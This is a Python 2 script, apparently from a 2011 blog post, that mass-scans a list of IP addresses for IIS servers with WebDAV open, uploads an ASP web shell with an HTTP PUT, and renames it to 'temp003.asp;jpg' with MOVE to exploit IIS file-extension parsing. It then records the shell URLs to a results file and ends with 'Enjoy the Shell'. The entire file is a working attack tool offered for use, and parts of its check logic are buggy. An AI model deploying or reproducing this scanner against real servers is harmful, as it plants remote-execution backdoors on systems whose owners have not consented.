#!/usr/bin/python

#This is the Python Script which Scans for IIS Servers which has WebDav Exploitable and autoupload shell and gives you access :)
#PYTHON IIS SCANNER WITH AUTO UPLOADING SHELL (WEB DAV EXPLOIT)
#http://www.subhashdasyam.com/2011/04/python-iis-scanner-with-auto-uploading.html



import socket,re,urllib,urllib2,os,sys

def options():
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((t_IP,t_port))
	req = "OPTIONS / HTTP/1.1\r\n"
	req += "Host: " + t_IP + "\r\n"
	req += "Connection: close\r\n"
	req += "\r\n\r\n"
	print req
	sock.send(req)
	data = sock.recv(1024)
	sock.close()
	r1 = re.compile('DAV')
	result = r1.findall(data)
	if result == []:
       		 print "On bad...the web DAV is not open.\n"
	else:
        
       		 print "WA HAHA LET US CHECK MORE time"
		 return None

def put():
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((t_IP,t_port))
    text = '<%execute request("hacker")%>'
    print "File content:\n" + text
    file_length = len(text)
    req = "PUT /" + 'temp003.txt' +" HTTP/1.1\r\n"
    req += "Connection: close\r\n"
    req += "Host: " + t_IP + "\r\n"
    req += "Content-Type: text/xml; charset='utf-8'\r\n"
    req += "Content-Length: " + str(file_length) +"\r\n\r\n"
    req += text + "\r\n"
    sock.send(req)
    data = sock.recv(1024)
    sock.close()
    r2 = re.compile('OK')
    result = r2.findall(data)
    if result == []:
        print "On bad...the web is not wirrten.\n"
    else:
        
        print "OK code uploaded"
        print "\ncode here " + 'http://'+t_IP+'/'+'temp003.txt'

def move():
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((t_IP,t_port))
    req = "MOVE /" + 'temp003.txt' +" HTTP/1.1\r\n"
    req += "Host: " + t_IP + "\r\n"
    req += "Destination: http://" + t_IP +'/'+ 'temp003.asp;jpg'+"\n\n"
    sock.send(req)
    data = sock.recv(1024)
    sock.close()
    r3 = re.compile('asp')
    result = r3.findall(data)
    if result == []:
        print "On bad...the web is not wirrten.\n"
    else:
        print "\n_shell :D and check RESULT.TXT \nhttp://" + t_IP +'/'+ 'temp003.asp;jpg'+"\n\n"
        temp="http://" + t_IP +'/'+ 'temp003.asp;jpg'
        os.system('echo'+' '+ temp +' >>RESULT.txt')



t_port = 80

print "\===============Auto Upload Shell=================="
print "\n[1] Check the Vulnerability"
#IP=raw_input("enter your target ip like 1.1.1.0/24:")
#inp = raw_input("enter your choice:")
#if inp == '1':
# options()
# if options() is None:
#   put()
#    move()
IP=raw_input("enter your txt position like C:\1.txt:")
f=open(IP,'r')
lines=f.readlines()

#b = 'nmap'+' '+'--open '+''+'-p 80 ' + '' + IP
#print b +'\r\n'+'Now go for find the dork server'
#a = str(os.popen(b).readlines())
#r1 = re.compile("\d*\.\d*\.\d*\.\d*")
#ip = r1.findall(a)
ips=[]
#if ip==[]:
#   sys.exit()
for x in lines:
    x=x.strip()
    ips.append(x)

for y in ips:
     t_IP = y
    
     try:
          print 'now scan the '+y
          options()
          if options() is None:
              print "noting to do"
          else:
              print "start test" 
              put()
              move()
     except:
		continue
print "Enjoy the Shell"
